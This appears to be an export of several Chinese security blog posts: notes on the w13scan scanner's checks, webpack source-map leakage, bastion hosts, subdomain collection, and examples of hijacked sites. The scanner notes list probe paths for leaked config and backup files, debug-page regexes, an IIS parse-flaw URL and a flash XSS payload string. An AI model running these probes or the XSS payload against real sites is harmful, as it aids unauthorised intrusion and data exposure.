<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [<span class="string">&#x27;config/config_ucenter.php.bak&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/.config_ucenter.php.swp&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/.config_global.php.swp&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/config_global.php.1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;uc_server/data/config.inc.php.bak&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;config/config_global.php.bak&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;include/config.inc.php.tmp&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>判定依据: 状态码200或206 且 源码含<code>&lt;?php</code>这个字符串</p>
<p>路径:<code>static/image/admincp/getcolor.htm&#39;</code></p>
<p>判定依据:源码含<code>if(fun) eval(&#39;parent.&#39;+fun+&#39;</code></p>
<hr>
<h3 id="错误页面信息泄漏"><a href="#错误页面信息泄漏" class="headerlink" title="错误页面信息泄漏:"></a>错误页面信息泄漏:</h3><p>访问一个不存在的错误页面，可以从这个页面中获取一些信息</p>
<p>随机生成一个url: <code>www.xxxx.com/随机字符串.jsp</code>,去访问</p>
<p>然后去正则匹配看是以下哪一类:</p>
<ul>
<li><code>ASPNETPathDisclosure</code></li>
<li><code>Struts2DevMod</code></li>
<li><code>Django DEBUG MODEL</code></li>
<li><code>RailsDevMode</code></li>
<li><code>RequiredParameter</code></li>
<li><code>Thinkphp3 Debug</code></li>
</ul>
<p>正则规则如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re_list = &#123;</span><br><span class="line">    <span class="string">&quot;ASPNETPathDisclosure&quot;</span>: <span class="string">&quot;&lt;title&gt;Invalid\sfile\sname\sfor\smonitoring:\s&#x27;([^&#x27;]*)&#x27;\.\sFile\snames\sfor\smonitoring\smust\shave\sabsolute\spaths\,\sand\sno\swildcards\.&lt;\/title&gt;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Struts2DevMod&quot;</span>: <span class="string">&quot;You are seeing this page because development mode is enabled.  Development mode, or devMode, enables extra&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Django DEBUG MODEL&quot;</span>: <span class="string">&quot;You&#x27;re seeing this error because you have &lt;code&gt;DEBUG = True&lt;\/code&gt; in&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;RailsDevMode&quot;</span>: <span class="string">&quot;&lt;title&gt;Action Controller: Exception caught&lt;\/title&gt;&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;RequiredParameter&quot;</span>: <span class="string">&quot;Required\s\w+\sparameter\s&#x27;([^&#x27;]+?)&#x27;\sis\snot\spresent&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Thinkphp3 Debug&quot;</span>: <span class="string">&#x27;&lt;p class=&quot;face&quot;&gt;:\(&lt;/p&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="flash-xss探测"><a href="#flash-xss探测" class="headerlink" title="flash xss探测:"></a>flash xss探测:</h3><p>文件字典如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">common/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">adminsoft/js/swfupload.swf</span><br><span class="line"></span><br><span class="line">statics/js/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">images/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">js/upload/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">addons/theme/stv1/_static/js/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">admin/kindeditor/plugins/multiimage/images/swfupload.swf</span><br><span class="line"></span><br><span class="line">includes/js/upload.swf</span><br><span class="line">js/swfupload/swfupload.swf</span><br><span class="line">Plus/swfupload/swfupload/swfupload.swf</span><br><span class="line"></span><br><span class="line">e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf</span><br><span class="line"></span><br><span class="line">include/lib/js/uploadify/uploadify.swf</span><br><span class="line">lib/swf/swfupload.swf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最终url为 <code>www.xxx.com/xxx.swf?movieName=%22]%29&#125;catch%28e%29&#123;if%28!window.x%29&#123;window.x=1;alert%28%22xss%22%29&#125;&#125;//</code></p>
<p>访问,再通过md5来判断.</p>
<hr>
<h3 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞:"></a>iis解析漏洞:</h3><p>url : <code>domain/robots.txt/.php</code></p>
<p>判定依据: <code>user-agent</code>在源码 和 <code>Content-Type</code>不含<code>text/plain</code></p>
<hr>
<h3 id="java-web目录探测"><a href="#java-web目录探测" class="headerlink" title="java web目录探测"></a>java web目录探测</h3><p>路径字典:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/web.xml.bak</span><br><span class="line">/WEB-INF/applicationContext.xml</span><br><span class="line">/WEB-INF/config.xml</span><br><span class="line">/WEB-INF/spring.xml</span><br><span class="line">/WEB-INF/struts-config.xml</span><br><span class="line">/WEB-INF/struts-front-config.xml</span><br><span class="line">/WEB-INF/struts/struts-config.xml</span><br><span class="line">/WEB-INF/classes/spring.xml</span><br><span class="line">/WEB-INF/classes/struts.xml</span><br><span class="line">/WEB-INF/classes/struts_manager.xml</span><br><span class="line">/WEB-INF/classes/conf/datasource.xml</span><br><span class="line">/WEB-INF/classes/data.xml</span><br><span class="line">/WEB-INF/classes/config/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/conf/spring/applicationContext-datasource.xml</span><br><span class="line">/WEB-INF/config/db/dataSource.xml</span><br><span class="line">/WEB-INF/spring-cfg/applicationContext.xml</span><br><span class="line">/WEB-INF/dwr.xml</span><br><span class="line">/WEB-INF/classes/hibernate.cfg.xml</span><br><span class="line">/WEB-INF/classes/rabbitmq.xml</span><br><span class="line">/WEB-INF/conf/activemq.xml</span><br><span class="line">/server.xml</span><br><span class="line">/config/database.yml</span><br><span class="line">/configprops</span><br><span class="line">/WEB-INF/database.properties</span><br><span class="line">/WEB-INF/web.properties</span><br><span class="line">/WEB-INF/log4j.properties</span><br><span class="line">/WEB-INF/classes/dataBase.properties</span><br><span class="line">/WEB-INF/classes/application.properties</span><br><span class="line">/WEB-INF/classes/jdbc.properties</span><br><span class="line">/WEB-INF/classes/db.properties</span><br><span class="line">/WEB-INF/classes/conf/jdbc.properties</span><br><span class="line">/WEB-INF/classes/security.properties</span><br><span class="line">/WEB-INF/conf/database_config.properties</span><br><span class="line">/WEB-INF/config/dbconfig</span><br></pre></td></tr></table></figure>

<p>规则格式和判定方式和Perfolder里的敏感文件扫描一样。</p>
<p>规则格式:<code>&#123;&#39;path&#39;: &#39;/WEB-INF/web.xml&#39;, &#39;tag&#39;: &#39;&lt;?xml&#39;, &#39;content-type&#39;: &#39;xml&#39;, &#39;content-type_no&#39;: &#39;&#39;</code></p>
<ul>
<li><code>tag</code>: html源码特征</li>
<li><code>content-type</code>: 文件拓展名</li>
<li><code>content-type_no</code>: 文件拓展名黑名单</li>
</ul>
<p>原理:</p>
<p>拼接url,发包访问,返回码为200且同时满足以下3种条件</p>
<ol>
<li>符合html源码特征</li>
<li>符合文件拓展名</li>
<li>不在文件拓展名黑名单</li>
</ol>
<hr>
<h3 id="敏感目录探测"><a href="#敏感目录探测" class="headerlink" title="敏感目录探测"></a>敏感目录探测</h3><p>字典:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">folders = [<span class="string">&#x27;/admin&#x27;</span>, <span class="string">&#x27;/bak&#x27;</span>, <span class="string">&#x27;/backup&#x27;</span>, <span class="string">&#x27;/conf&#x27;</span>, <span class="string">&#x27;/config&#x27;</span>, <span class="string">&#x27;/db&#x27;</span>, <span class="string">&#x27;/debug&#x27;</span>, <span class="string">&#x27;/data&#x27;</span>, <span class="string">&#x27;/database&#x27;</span>, <span class="string">&#x27;/deploy&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/WEB-INF&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;/install&#x27;</span>, <span class="string">&#x27;/manage&#x27;</span>, <span class="string">&#x27;/manager&#x27;</span>, <span class="string">&#x27;/monitor&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/temp&#x27;</span>, <span class="string">&#x27;/test&#x27;</span>]</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="wordpress-备份文件"><a href="#wordpress-备份文件" class="headerlink" title="wordpress 备份文件"></a>wordpress 备份文件</h3><p>字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_lst = [<span class="string">&#x27;/wp-config.php.inc&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.inc&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.bak&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.php~&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/.wp-config.php.swp&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;/wp-config.php.bak&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>判定依据: 状态码为200且 源码含<code>&lt;?php</code></p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://github.com/w-digital-scanner/w13scan/blob/master/README_CN.md">w13scan</a></li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack带来的安全风险</title>
    <url>//15590.html</url>
    <content><![CDATA[<h1 id="webpack"><a href="#webpack" class="headerlink" title="webpack:"></a>webpack:</h1><h2 id="什么是webpack"><a href="#什么是webpack" class="headerlink" title="什么是webpack:"></a>什么是webpack:</h2><p><strong>webpack用于编译JavaScript模块。</strong></p>
<p>关注javascript技术的同学一定知道，在CommonJS和ES6中，为了支持模块化，而引入了export&#x2F;require&#x2F;import这类东西，模块化可以降低开发的复杂度，用于支撑前端的复杂功能，但是模块化后，也带来了许多问题，比如老版本的浏览器不支持ES6&#x2F;JSX语法，开发和线上不能保持一致，这就为WebPack类的自动化代码转换工具的出现提供了需求。</p>
<p><strong>WebPack可以看做是模块打包机：它做的事情是，分析你的项目结构，找到JavaScript模块以及其它的一些浏览器不能直接运行的拓展语言（Scss，TypeScript等），并将其转换和打包为合适的格式供浏览器使用。</strong></p>
<p>按照官网的说法，webpack可以打包一切资源&#x2F;图片&#x2F;样式&#x2F;依赖等等，webpack默认只支持js模块打包，对于其他文件就需要用loader解析器，比如在vue中，直观的效果就是使用webpack可以将使用的vue，css，图片等打包成一个js。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200414114758.png" alt="20200414114758"></p>
<hr>
<h1 id="Source-Map"><a href="#Source-Map" class="headerlink" title="Source Map:"></a>Source Map:</h1><p>部署前端之前，开发者通常会对代码进行打包压缩，这样可以减少代码大小，从而有效提高访问速度。然而，压缩代码的报错信息是很难Debug的，因为它的行号和列号已经失真。这时就需要Source Map来还原真实的出错位置了。</p>
<h2 id="为啥变换代码"><a href="#为啥变换代码" class="headerlink" title="为啥变换代码?"></a>为啥变换代码?</h2><p>前端代码越来越复杂的情况下，开发者通常会使用webpack、UglifyJS2等工具对代码进行打包变换，这样可以减少代码大小，有效提高访问速度。关于变换代码的原因，这里不妨引用一下大神阮一峰的JavaScript Source Map 详解:</p>
<blockquote>
<ul>
<li>压缩，减小体积。比如jQuery 1.9的源码，压缩前是252KB，压缩后是32KB。</li>
<li>多个文件合并，减少HTTP请求数。</li>
<li>其他语言编译成JavaScript。最常见的例子就是CoffeeScript。</li>
</ul>
</blockquote>
<h2 id="如何变换代码"><a href="#如何变换代码" class="headerlink" title="如何变换代码?"></a>如何变换代码?</h2><p>下面是一个简单的“hello World”程序hello.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;Fundebug&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> greeting = <span class="string">&quot;Hello, &quot;</span> + <span class="title class_">Name</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(greeting);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sayHello</span>();</span><br></pre></td></tr></table></figure>

<p>使用UglifyJS2对源代码进行压缩变换:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uglifyjs hello.js \</span><br><span class="line">         -m toplevel=<span class="literal">true</span> \</span><br><span class="line">         -c unused=<span class="literal">true</span>,collapse_vars=<span class="literal">true</span> \</span><br><span class="line">         -o hello.min.js</span><br></pre></td></tr></table></figure>

<p>压缩后的代码<strong>hello.min.js</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">o</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> o=<span class="string">&quot;Hello, &quot;</span>+<span class="title class_">Name</span>;<span class="variable language_">console</span>.<span class="title function_">log</span>(o)&#125;<span class="title function_">o</span>();</span><br></pre></td></tr></table></figure>

<h2 id="为啥需要Source-Map"><a href="#为啥需要Source-Map" class="headerlink" title="为啥需要Source Map?"></a>为啥需要Source Map?</h2><p>使用Firefox执行<strong>hello.js</strong>的报错信息是这样:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReferenceError: Name is not defined</span><br><span class="line">	sayHello file:///Users/fundebug/sourcemap-tutorial/hello.js:4:9</span><br><span class="line">	&lt;匿名&gt; file:///Users/fundebug/sourcemap-tutorial/hello.js:8:1</span><br></pre></td></tr></table></figure>

<p>而<strong>hello.min.js</strong>的报错信息是这样:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReferenceError: Name is not defined</span><br><span class="line">	o file:///Users/fundebug/sourcemap-tutorial/hello.min.js:1:18</span><br><span class="line">	&lt;匿名&gt; file:///Users/fundebug/sourcemap-tutorial/hello.min.js:1:59</span><br></pre></td></tr></table></figure>

<p>对比压缩前后的出错信息，我们会发现，错误行号和列号已经失真，且函数名也经过了变换。而对于真实的前端项目，开发者会将数十个源文件压缩为一个文件，这时，错误的列号可能多达数千，且出错的真实文件名也是很难确定的，这样的话，压缩代码的报错信息是很难Debug的。</p>
<p>而Source Map则可以用于还原真实的出错位置，帮助开发者更快的Debug。</p>
<hr>
<p>webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。</p>
<p>source-map文件，这个文件是编译过程中变量与方法的映射表。</p>
<hr>
<h1 id="VUE-x2F-REACT开发场景"><a href="#VUE-x2F-REACT开发场景" class="headerlink" title="VUE&#x2F;REACT开发场景"></a>VUE&#x2F;REACT开发场景</h1><p>在VUE&#x2F;REACT开发场景下 ，前端开发会引入如模块化等诸多新特性，前端开发不再是几个简单的js文件，开发完成后会通过webpack等打包工具打包生成部署使用的js文件，但是如果我们直接分析该编译的js，很难看懂。</p>
<p>比如某页面下的app.bundle.js,反正我是看不懂写的是啥，这个js文件就是webpack打包后的结果，但是由于我是开启了source-map调试模式，如果你是用chrome浏览器打开的，打开devtools-sources，应该可以看到一个<code>webpack://</code>，这个就是chrome对source-map调试的支持，点开src目录下就可以看到js代码源文件。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200414115217.png" alt="20200414115217"></p>
<h2 id="为什么会有这类问题"><a href="#为什么会有这类问题" class="headerlink" title="为什么会有这类问题?"></a>为什么会有这类问题?</h2><p>大多数开发人员没有意识到的是，这些源映射<code>source-map</code>实际上包含了其前端源代码的全部。</p>
<p>是的，他们知道可以进行映射，但是源映射后的文件几乎为乱码，更不用说理解了。由于这种误解，发现开发团队在其Webpack配置中将JavaScript源映射留在生产环境中是相对常见的。</p>
<hr>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案:"></a>解决方案:</h2><p>修改<code>config/index.js</code>中的<code>build</code>对象<code>productionSourceMap: false</code>即可</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200418144413.png" alt="20200418144413"></p>
<hr>
<h1 id="渗透思路or危害"><a href="#渗透思路or危害" class="headerlink" title="渗透思路or危害:"></a>渗透思路or危害:</h1><ul>
<li><p>通过<code>source-map</code>可以获取前端源码,也就是说从黑盒变成了灰盒。</p>
</li>
<li><p>泄露的各种信息如网站路径、API、加密算法、管理员邮箱、内部功能等等。</p>
</li>
<li><p>很多vue应用都是先渲染页面再判断是否登陆，根据这个小缺陷，我们首先可以查看相关功能</p>
</li>
<li><p>前端源码被人copy走</p>
</li>
</ul>
<hr>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h1><p><a href="https://github.com/rarecoil/unwebpack-sourcemap">unwebpack-sourcemap</a></p>
<p>通过查看浏览器中包含的JavaScript文件并提取捆绑的JavaScript文件底部存在的sourceMappingURL来获取源地图。</p>
<p>原理:</p>
<p>在页面正则匹配 <code>regex = &quot;\\/\\/#\s*sourceMappingURL=(.*)$&quot;</code></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.secpulse.com/archives/96416.html">webpack带来的安全风险</a></li>
<li><a href="https://www.cnblogs.com/fundebug/p/source_map_tutorial.html">Source Map入门教程</a></li>
<li><a href="https://www.freebuf.com/articles/web/193230.html">前端打包编译时代来临对漏洞挖掘的影响</a></li>
<li><a href="https://blog.csdn.net/cuixiping/article/details/8592823">压缩版JS的调试利器JavaScript Source Map基本介绍</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/26033573">谈谈我是如何获得知乎的前端源码的</a></li>
<li><a href="https://medium.com/@rarecoil/spa-source-code-recovery-by-un-webpacking-source-maps-ef830fc2351d">SPA source code recovery by un-Webpacking source maps</a></li>
<li><a href="https://wangdaodao.com/20190724/webpack-sources-vue.html">Webpack打包后禁止Sources查看VUE源码</a></li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>堡垒机的一些知识</title>
    <url>//9254.html</url>
    <content><![CDATA[<h1 id="堡垒机的起源"><a href="#堡垒机的起源" class="headerlink" title="堡垒机的起源:"></a>堡垒机的起源:</h1><p>2000年前后，随着全球信息技术的不断发展和信息化建设的不断进步，电信、财政、税务、公安、金融、电力、石油等重要行业的大型机构和企业内网中，开始使用数量较多的服务器主机来运行关键业务，并逐步把服务器主机集中到机房中统一管理。</p>
<p><strong>随着服务器的大集中和IT系统的日趋复杂，系统管理员、系统运维人员、系统应用高权限用户、第三方厂商的维护人员以及其他临时高权限人员等不同背景的运维人员开始给企业信息系统安全运行带来较大的潜在风险。</strong></p>
<p>同时，随着萨班斯法案等合规性法律要求开始生效，企业的经营活动，企业管理、项目和投资等，都要有控制和审计手段。</p>
<p><strong>管理人员需要有有效的技术手段和专业产品来控制、限制和追踪用户的行为，判定用户的行为是否对企业内部网络的安全运行带来威胁。</strong></p>
<p>因此，运维堡垒机应运而生。</p>
<hr>
<h1 id="堡垒机的发展"><a href="#堡垒机的发展" class="headerlink" title="堡垒机的发展:"></a>堡垒机的发展:</h1><h2 id="第一代堡垒机"><a href="#第一代堡垒机" class="headerlink" title="第一代堡垒机"></a>第一代堡垒机</h2><p>跳板机可被称为第一代堡垒机。</p>
<p>2000年左右，高端行业用户为了对运维人员的远程登录进行集中管理，会在机房里部署跳板机。跳板机就是一台服务器，维护人员在维护过程中，首先要统一登录到这台服务器上，然后从这台服务器再登录到目标设备进行维护。</p>
<p><strong>但跳板机并没有实现对运维人员操作行为的控制和审计，使用跳板机过程中还是会有误操作、违规操作导致的操作事故，一旦出现操作事故很难快速定位原因和责任人。</strong></p>
<h2 id="第二代堡垒机"><a href="#第二代堡垒机" class="headerlink" title="第二代堡垒机"></a>第二代堡垒机</h2><p>由于跳板机存在的各类问题，出现了改进后的第二代堡垒机。</p>
<p>第二代堡垒机被部署在外部网络和企业内部网络之间，提供对内部网络特定资源的安全访问，主要采用SSL ×××方式工作。</p>
<p>对内部网络特定资源的访问则必须先登录到堡垒机上方可完成。主要满足用户对最常用的运维协议的功能性需求，支持对文本类（如Telnet，SSH）和图形类（如RDP）等运维协议的审计。</p>
<h2 id="第三代堡垒机"><a href="#第三代堡垒机" class="headerlink" title="第三代堡垒机"></a>第三代堡垒机</h2><p>随着运维审计需求的增多，用户对堡垒机支持的协议种类需求越来越多，第二代堡垒机在响应这些需求方面显得力不从心，因此，出现了采用协议代理的方式的第三代堡垒机，它切断了终端计算机对网络和服务器资源的直接访问，接管了终端计算机对网络和服务器的访问。</p>
<p>第三代堡垒机综合了更多的用户应用需求，其支持的协议相应增加了如数据库协议、web应用协议等。目前市面上销售的堡垒机大多属于第三代堡垒机。</p>
<h2 id="堡垒机的问题"><a href="#堡垒机的问题" class="headerlink" title="堡垒机的问题:"></a>堡垒机的问题:</h2><p>部分运维堡垒机厂商的产品普遍存在以下问题:</p>
<ol>
<li><strong>运维堡垒机成为了新的系统脆弱点。</strong>由于运维堡垒机是连接前后端的唯一途径，首当其冲成为了被hack的重要目标，风险加大。因此应该尽量减少系统加载的服务或模块，从而尽可能减少可被hack的风险。</li>
</ol>
<blockquote>
<p>两步验证:动态口令</p>
</blockquote>
<ol start="2">
<li>部署困难，管理繁琐，用户操作体验不佳。特别是在管理设备种类较多、设备数量规模较大的情况下，存在配置界面复杂，操作方式不连贯，部署费工费时等问题。</li>
</ol>
<hr>
<h1 id="信息系统运维中的问题"><a href="#信息系统运维中的问题" class="headerlink" title="信息系统运维中的问题:"></a>信息系统运维中的问题:</h1><h2 id="1、一个用户使用多个账号"><a href="#1、一个用户使用多个账号" class="headerlink" title="1、一个用户使用多个账号"></a>1、一个用户使用多个账号</h2><p>　　由于信息系统庞大，拥有少则数十台，多则上百台的服务器，而维护人员又极其有限，单个工程师维护多套系统的现象普遍存在。伴随而来就是工程师记事簿上密密麻麻的账号密码，同时在多套主机系统之间切换，其工作量和复杂度成倍增加，直接导致的后果就是工作效率低下，操作繁琐容易出现误操作，影响系统正常运行。</p>
<blockquote>
<p>操作繁琐麻烦</p>
</blockquote>
<h2 id="2、权限分配粗放，缺乏细粒度"><a href="#2、权限分配粗放，缺乏细粒度" class="headerlink" title="2、权限分配粗放，缺乏细粒度"></a>2、权限分配粗放，缺乏细粒度</h2><p>　　大多数的系统授权是采用操作系统自身的授权系统，授权功能分散在各个设备和系统中，缺乏统一的运维操作授权策略，授权颗粒度粗，无法基于最小权限分配原则管理用户权限，因此，出现运维人员权限过大和内部操作权限滥用等问题。</p>
<h2 id="3、第三方代维人员的操作行为缺乏有效监控"><a href="#3、第三方代维人员的操作行为缺乏有效监控" class="headerlink" title="3、第三方代维人员的操作行为缺乏有效监控"></a>3、第三方代维人员的操作行为缺乏有效监控</h2><p>　　随着企业信息化建设的快速发展，为缓解企业IT人员不足的压力，越来越多的企业系统运维工作转交给系统供应商或第三方代维商，企业既解决了人员不足的问题，又解决了招聘新人的技能培训问题。但是在享受便利的同时，由于涉及提供商，代维商过多，人员复杂流动性又大，对操作行为缺少监控带来的风险日益凸现，因此，需要通过严格的权限控制和操作行为审计。</p>
<p>　　针对上述问题，相信广大运维工程师都有“搔头不知痒处”的苦恼。不用急，这个时候我们的堡垒机登场了。</p>
<hr>
<h1 id="堡垒机的审计过程"><a href="#堡垒机的审计过程" class="headerlink" title="堡垒机的审计过程"></a>堡垒机的审计过程</h1><p>堡垒机又名运维安全审计系统，<strong>首先他将服务器群的访问限定单一入口，所有用户均不能直接访问服务器，需通过堡垒机中转，这样就有条件对整个流量进行监控，对风险操作进行记录报警，对用户进行集中地细粒度权限管理。</strong></p>
<p>再在堡垒机中集成单点登录(SSO)功能，用户只需登录一次就可以访问所有相互信任的应用系统解决单用户多账号问题;再就协议代理，通过截获HTTP、ftp、ssh、rdp、vnc通信协议内容，解析并记录IT运维人员的操作过程。</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.freebuf.com/news/153326.html">细说堡垒机与数据库审计</a></li>
<li><a href="https://blog.51cto.com/14116240/2340253">运维堡垒机的起源、发展和未来趋势</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>子域名搜集</title>
    <url>//860.html</url>
    <content><![CDATA[<h1 id="为什么要搜集子域名"><a href="#为什么要搜集子域名" class="headerlink" title="为什么要搜集子域名?"></a>为什么要搜集子域名?</h1><p><img src="https://i.loli.net/2019/04/25/5cc1d743199d5.jpg"></p>
<p>这些子域名都是与<strong>企业的资产</strong>相关联的.发现更多的子域名,意味着发现了更多的企业资产.</p>
<h2 id="攻击者的角度"><a href="#攻击者的角度" class="headerlink" title="攻击者的角度:"></a>攻击者的角度:</h2><p>对于攻击者来说,意义在于可以发现更多的攻击点,增大攻击面<code>attack face</code>,接着选取一个最脆弱的目标进行攻击.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7443e383.jpg"></p>
<p>在《Metasploit渗透测试指南》里面有提到,真正的攻击者是不会造成很多噪声的,意味着他会选择一条代价最小、收益最高的攻击路径,来获取他目标系统的高权限.</p>
<p>为此他需要先找到一个最脆弱的目标.也就是找到企业资产中最脆弱的一部分来进行攻击.</p>
<p>而通过对子域名进行搜集,便是发现脆弱资产当中必要的一步.</p>
<h2 id="防御者的角度"><a href="#防御者的角度" class="headerlink" title="防御者的角度:"></a>防御者的角度:</h2><p>对于防御者来说,意义在于能够对资产进行更好的管理.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d74575511.jpg"></p>
<p>企业大部分做的安全工作都是围绕企业的资产来进行的。</p>
<p>可现状是,由于企业大、业务线多、管理难等问题,很多时候企业会匆忙上线一个新的应用或服务,这样就会造成出现很多“在野资产”.</p>
<p>这种“在野资产”往往是等到出现安全事件后,去追责才会被发现。</p>
<p>这种时候,如果能够提前对新增、新上线的资产进行发现的话，就能更好的保障企业的资产安全.</p>
<p>而通过对子域名进行搜集,便是发现“在野资产”当中必要的一步.</p>
<hr>
<h1 id="搜集途径"><a href="#搜集途径" class="headerlink" title="搜集途径:"></a>搜集途径:</h1><h2 id="外部搜集途径"><a href="#外部搜集途径" class="headerlink" title="外部搜集途径:"></a>外部搜集途径:</h2><p>在外部,可以通过很多方式进行搜集,这张思维导图列出来的已经比较详细了。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g09uim238mj30u00z7npd.jpg"></p>
<p>其他接口:</p>
<ul>
<li><a href="http://ce.baidu.com/index/getRelatedSites?site_address=bgy.com.cn">百度云观测接口</a></li>
</ul>
<h2 id="内部搜集途径"><a href="#内部搜集途径" class="headerlink" title="内部搜集途径:"></a>内部搜集途径:</h2><p>除了通过互联网,在外部进行必要的搜集以外,也是需要内部对子域名进行搜集来进行补充的.</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://github.com/zdresearch/OWASP-Nettacker/blob/85cbaab94415c8f994250d2f3d2ddb8394853f4d/lib/scan/subdomain/engine.py">OWASP-Nettacker</a></li>
<li><a href="https://speakerdeck.com/yamakira/esoteric-sub-domain-enumeration-techniques?slide=8">esoteric-sub-domain-enumeration-techniques</a></li>
<li><a href="https://github.com/bit4woo/teemo">teemo</a></li>
<li>《Metasploit渗透测试指南》</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>暗链案例初探</title>
    <url>//23101.html</url>
    <content><![CDATA[<h1 id="主页被黑被篡改"><a href="#主页被黑被篡改" class="headerlink" title="主页被黑被篡改:"></a>主页被黑被篡改:</h1><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1:"></a>案例1:</h2><p><code>https://www.and-the-like.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc41fb5354335400.png"></p>
<p>无法关键词识别,只有图片</p>
<hr>
<h2 id="案例2"><a href="#案例2" class="headerlink" title="案例2:"></a>案例2:</h2><p><code>https://www.daobangedu.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc42c6e127e17972.png"></p>
<p>有关键词:时时彩等</p>
<hr>
<h2 id="案例3"><a href="#案例3" class="headerlink" title="案例3:"></a>案例3:</h2><p><code>www.lexuedidai.com</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc4339e253695045.png"></p>
<p>有图片也有关键字<br>关键词:彩票 赌博 投注</p>
<p>随便访问里面的js的网站,有个<code>phpinfo</code>呀.<br><code>http://275195.com/index.php</code><br><img src="https://i.loli.net/2019/05/16/5cdc440978f9b52950.png"></p>
<hr>
<h3 id="案例4"><a href="#案例4" class="headerlink" title="案例4:"></a>案例4:</h3><p><code>http://www.fslp1.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc44b187d5914134.png"></p>
<p>关键词:彩票,娱乐平台,时时彩</p>
<hr>
